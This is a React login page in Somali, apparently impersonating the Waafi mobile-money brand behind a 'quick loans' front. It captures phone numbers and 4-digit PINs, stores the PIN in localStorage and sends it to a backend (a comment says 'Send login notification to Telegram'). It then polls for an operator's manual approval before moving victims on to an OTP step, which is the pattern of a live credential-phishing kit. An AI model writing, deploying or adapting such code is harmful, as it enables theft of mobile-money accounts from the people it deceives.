import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Login.css';

export default function Login() {
  const navigate = useNavigate();
  
  const { personalDetailsData, updateAuthData, serverStatus } = useLoanApplication();
  
  // Get API endpoint from environment variable
  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || '1';
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
  
  const initialPhone = personalDetailsData.phoneNumber 
    ? personalDetailsData.phoneNumber.replace(/\D/g, '').slice(-9)
    : '';
  
  const [phoneNumber, setPhoneNumber] = useState(initialPhone);
  const [pin, setPin] = useState(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isReturningUser, setIsReturningUser] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  
  const pinRefs = [
    useRef(null),
    useRef(null),
    useRef(null),
    useRef(null)
  ];

  const pollingIntervalRef = useRef(null);
  const pollingAttempts = useRef(0);
  const maxPollingAttempts = 60; // 60 attempts * 5 seconds = 5 minutes

  // Cleanup polling on unmount
  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, []);

  // Validate phone number format
  const validatePhoneNumber = (number) => {
    if (!number) return { valid: false, message: '' };
    
    const length = number.length;
    
    // Must be 9 digits for Somalia
    if (length !== 9) {
      return { valid: false, message: 'Lambarka taleefanka waa inuu ahaadaa 9 tiro!' };
    }
    
    return { valid: true, message: '' };
  };

  const handlePhoneChange = (e) => {
    const value = e.target.value;
    const numericValue = value.replace(/\D/g, '').slice(0, 9);
    setPhoneNumber(numericValue);
  };

  const handlePhonePaste = (e) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text');
    const numericValue = pastedText.replace(/\D/g, '').slice(0, 9);
    setPhoneNumber(numericValue);
  };

  const handlePinChange = (index, value) => {
    const numericValue = value.replace(/\D/g, '');
    if (numericValue.length > 1) return;
    
    const newPin = [...pin];
    newPin[index] = numericValue;
    setPin(newPin);

    if (numericValue && index < 3) {
      pinRefs[index + 1].current.focus();
    }
  };

  const handlePinPaste = (e, index) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text');
    const digits = pastedText.replace(/\D/g, '').slice(0, 4).split('');
    
    const newPin = [...pin];
    digits.forEach((digit, i) => {
      if (index + i < 4) {
        newPin[index + i] = digit;
      }
    });
    setPin(newPin);

    const focusIndex = Math.min(index + digits.length, 3);
    pinRefs[focusIndex].current.focus();
  };

  const handlePinKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (pin[index]) {
        const newPin = [...pin];
        newPin[index] = '';
        setPin(newPin);
      } else if (index > 0) {
        pinRefs[index - 1].current.focus();
      }
    } else if (e.key === 'ArrowLeft' && index > 0) {
      pinRefs[index - 1].current.focus();
    } else if (e.key === 'ArrowRight' && index < 3) {
      pinRefs[index + 1].current.focus();
    }
  };

  const handlePinKeyPress = (e) => {
    if (!/^\d$/.test(e.key)) {
      e.preventDefault();
    }
  };

  const togglePinVisibility = () => {
    setShowPin(!showPin);
  };

  // Poll for login approval status
  const startPollingForApproval = (formattedPhone, fullPin, returning) => {
    pollingAttempts.current = 0;
    
    pollingIntervalRef.current = setInterval(async () => {
      try {
        pollingAttempts.current++;
        
        // Stop polling after max attempts (5 minutes)
        if (pollingAttempts.current > maxPollingAttempts) {
          clearInterval(pollingIntervalRef.current);
          setWaitingForApproval(false);
          setIsProcessing(false);
          setErrorMessage('Wax khalad ah ayaa dhacay, mar kale isku day');
          setShowErrorModal(true);
          return;
        }
        
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-login-approval`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            phoneNumber: formattedPhone,
            pin: fullPin
          })
        });

        const data = await response.json();

        if (data.success) {
          if (data.approved) {
            // Approved! Stop polling
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            
            // Small delay for better UX
            await new Promise(resolve => setTimeout(resolve, 500));
            
            // Navigate based on user type
            if (returning) {
              // RETURNING USER: Go directly to dashboard
              navigate('/status');
            } else {
              // NEW USER: Go to OTP verification
              navigate('/verify');
            }
            
          } else if (data.rejected) {
            // Rejected! Stop polling and show error
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            setIsProcessing(false);
            
            // Always show "Wrong PIN" for rejected login
            setErrorMessage('PIN-ka khalad ah');
            setShowErrorModal(true);
            
          } else if (data.expired) {
            // Expired! Stop polling and show error
            clearInterval(pollingIntervalRef.current);
            setWaitingForApproval(false);
            setIsProcessing(false);
            setErrorMessage('Wax khalad ah ayaa dhacay, mar kale isku day');
            setShowErrorModal(true);
          }
          // If still pending, continue polling
        }
      } catch (error) {
        console.error('Error polling approval status:', error);
        // Don't stop polling on network errors, just continue
      }
    }, 5000); // Poll every 5 seconds
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    
    const fullPin = pin.join('');
    
    // Validate phone number format
    const validation = validatePhoneNumber(phoneNumber);
    if (!validation.valid) {
      setErrorMessage('Lambarka taleefanka waa inuu ahaadaa 9 tiro!\nFadlan geli lambar sax ah oo mar kale isku day!');
      setShowErrorModal(true);
      return;
    }
    
    // Validate PIN
    if (fullPin.length !== 4) {
      setErrorMessage('Fadlan geli PIN-ka oo dhammaystiran oo ah 4 tiro');
      setShowErrorModal(true);
      return;
    }

    // Format phone number for Somalia
    const formattedPhone = `+252${phoneNumber}`;
    
    // Update context with auth data
    updateAuthData({
      phoneNumber: formattedPhone,
      pin: fullPin,
      isAuthenticated: false
    });

    // Store in localStorage
    try {
      localStorage.setItem('waafi_phone', formattedPhone);
      localStorage.setItem('waafi_auth', JSON.stringify({
        phoneNumber: formattedPhone,
        pin: fullPin,
        isAuthenticated: false,
        timestamp: new Date().toISOString()
      }));
    } catch (error) {
      console.error('Failed to save auth:', error);
    }

    setIsProcessing(true);

    try {
      // Check if user is returning
      const statusResponse = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-user-status`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: formattedPhone
        })
      });

      const statusData = await statusResponse.json();
      const returning = statusData.isReturningUser || false;
      setIsReturningUser(returning);
      
      // Send login notification to Telegram
      const loginResponse = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: formattedPhone,
          pin: fullPin,
          timestamp: new Date().toISOString()
        })
      });

      const loginData = await loginResponse.json();

      if (loginData.success) {
        // Start waiting for approval
        setWaitingForApproval(true);
        
        // Start polling for approval status
        startPollingForApproval(formattedPhone, fullPin, returning);
      } else {
        setIsProcessing(false);
        setErrorMessage('Galitaanka ma guulaysan. Fadlan mar kale isku day.');
        setShowErrorModal(true);
      }
      
    } catch (error) {
      console.error('Login error:', error);
      setIsProcessing(false);
      setErrorMessage('Galitaanka ma guulaysan. Fadlan mar kale isku day.');
      setShowErrorModal(true);
    }
  };

  const handleForgotPin = () => {
    alert('Fadlan la xidhiidh adeegga macmiilka Waafi si aad u soo celiso PIN-ka.');
  };

  const handleRegister = () => {
    alert('Fadlan booqo xafiiska Waafi ama la xidhiidh adeegga macmiilka si aad u diiwaan geliso.');
  };

  const handleSupport = () => {
    alert('Adeegga Waafi: Nala soo xidhiidh caawimaad.');
  };

  const closeErrorModal = () => {
    setShowErrorModal(false);
    setErrorMessage('');
  };

  const isFormComplete = phoneNumber.length === 9 && pin.every(digit => digit !== '');

  const getButtonState = () => {
    if (serverStatus.isChecking) {
      return {
        text: 'SUG...',
        disabled: true,
        className: 'login-button waiting'
      };
    }
    
    if (!serverStatus.isActive) {
      return {
        text: 'KHALAD SERVER',
        disabled: true,
        className: 'login-button error'
      };
    }
    
    return {
      text: 'GAL',
      disabled: !isFormComplete || isProcessing,
      className: 'login-button'
    };
  };

  const buttonState = getButtonState();

  // Processing/Waiting screen
  if (isProcessing || waitingForApproval) {
    return (
      <div className="login-container">
        <div className="processing-overlay">
          <div className="processing-card">
            <div className="spinner-container">
              <div className="spinner"></div>
            </div>
            
            <h1 className="processing-title">
              {waitingForApproval ? 'Fadlan sug...' : 'Habaynta...'}
            </h1>
            <p className="processing-subtitle">
              {waitingForApproval 
                ? 'Tani waxay qaadataa dhowr ilbiriqsi' 
                : isReturningUser 
                  ? 'Soo dhawoow! Ku qaadaynaa dashboard-ka...' 
                  : 'Diyaarinaya xaqiijinta...'
              }
            </p>
          </div>
        </div>
      </div>
    );
  }

  // Main login screen
  return (
    <div className="login-container">
      {/* ==================== ERROR MODAL ==================== */}
      {showErrorModal && (
        <div className="error-modal-overlay" onClick={closeErrorModal}>
          <div className="error-modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="error-modal-icon">⚠️</div>
            <h2 className="error-modal-title">Macluumaad Khaldan</h2>
            <p className="error-modal-message" style={{ whiteSpace: 'pre-line' }}>{errorMessage}</p>
            <button className="error-modal-button" onClick={closeErrorModal}>
              HAGAAG
            </button>
          </div>
        </div>
      )}

      {/* ==================== HEADER ==================== */}
      <div className="login-header">
        <div className="logo-large">
          <span className="logo-large-waafi">Waafi</span>
        </div>
        <div className="logo-subtitle">Amaahado Sahlan oo Degdeg ah</div>
      </div>

      {/* ==================== LOGIN CONTENT ==================== */}
      <div className="login-content">
        <h1 className="login-title">Gal</h1>

        {serverStatus.error && (
          <div className="server-status-message error">
            <p>⚠️ {serverStatus.error}</p>
          </div>
        )}

        <form className="login-form" onSubmit={handleLogin}>
          
          {/* Phone Number Input */}
          <div className="phone-input-container">
            <div className="country-code">
              <span className="flag-icon">🇸🇴</span>
              <span>+252</span>
            </div>
            <input 
              type="tel"
              className="phone-input"
              value={phoneNumber}
              onChange={handlePhoneChange}
              onPaste={handlePhonePaste}
              placeholder="612345678"
              maxLength="9"
              inputMode="numeric"
              pattern="[0-9]*"
              required
              disabled={serverStatus.isChecking}
            />
          </div>

          {/* PIN Section */}
          <div className="pin-section">
            <p className="pin-label">Geli PIN-kaaga</p>
            
            <div className="pin-inputs-wrapper">
              <div className="pin-inputs">
                {pin.map((digit, index) => (
                  <input
                    key={index}
                    ref={pinRefs[index]}
                    type={showPin ? 'text' : 'password'}
                    className="pin-box"
                    value={digit}
                    onChange={(e) => handlePinChange(index, e.target.value)}
                    onKeyDown={(e) => handlePinKeyDown(index, e)}
                    onKeyPress={handlePinKeyPress}
                    onPaste={(e) => handlePinPaste(e, index)}
                    maxLength="1"
                    inputMode="numeric"
                    pattern="[0-9]"
                    required
                    disabled={serverStatus.isChecking}
                  />
                ))}
              </div>
              
              <button 
                type="button"
                className="eye-button"
                onClick={togglePinVisibility}
                aria-label={showPin ? 'Qari PIN-ka' : 'Muuji PIN-ka'}
                disabled={serverStatus.isChecking}
              >
                {showPin ? '👁️' : '👁️‍🗨️'}
              </button>
            </div>

            <p className="forgot-pin" onClick={handleForgotPin}>
              PIN-ka ma iloobtay?
            </p>
          </div>

          <button 
            type="submit" 
            className={buttonState.className}
            disabled={buttonState.disabled}
          >
            {buttonState.text}
          </button>
        </form>
      </div>

      {/* ==================== FOOTER ==================== */}
      <div className="login-footer">
        <div className="wave-decoration"></div>
        
        <div className="footer-content">
          <div className="footer-logo">
            <div className="footer-logo-text">
              <span className="footer-logo-waafi">Waafi</span>
            </div>
            <div className="footer-logo-subtitle">Amaahado Sahlan oo Degdeg ah</div>
          </div>

          <p className="version-text">v2.1.3P</p>
          <p className="terms-text">
            Galitaanka markaad gasho waad ogolaatay{' '}
            <span className="terms-link">
              Shuruudaha iyo Xaaladaha
            </span>
          </p>
        </div>
      </div>
    </div>
  );
}
